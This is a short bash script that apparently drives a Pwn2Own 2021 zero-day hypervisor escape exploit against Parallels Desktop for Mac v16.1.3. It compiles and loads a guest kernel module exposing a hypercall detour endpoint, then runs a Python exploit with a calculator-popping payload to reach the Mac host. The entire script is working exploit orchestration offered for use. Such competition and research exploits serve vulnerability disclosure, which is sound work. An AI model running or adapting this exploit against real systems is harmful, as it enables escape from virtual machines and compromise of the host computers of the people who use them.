#/bin/bash
echo "Zero day hypervisor escape exploit for Parallels Desktop for Mac v16.1.3"
echo "Author: Alisa Esage (contact@zerodayengineering.com)"
echo "Special for Pwn2Own 2021"
echo
echo "Stage 0: Set up (manual)"
echo
echo "[!] Reminder: install kernel build deps"
echo "[!] If you upgraded the system, reinstall Parallels Tools"
# sudo apt-get update
# sudo apt-get install build-essential linux-headers-$(uname -r)
echo
echo "Stage 1: Install the kernel helper"
echo
cd km
make clean && make 
if [[ -d /sys/module/prl_pwn ]]; then echo "[!] Kernel module is already loaded"; make unload; fi
make load 
if [[ -w /proc/prl_pwn ]]; then echo "[+] Hypercall detour endpoint at /proc/prl_pwn"; else echo "[!] Kernel module installation failed. Did you install Parallels Tools, or re-install them after the system/kernel upgrade?"; exit; fi
echo 
echo "Stage 2: Attack the vulnerability"
echo 
cd ..
python3 prl_pwn.py ./payload/pop_calc 
echo 
echo "Stage 3: Waiting for user to open Terminal on Mac..."
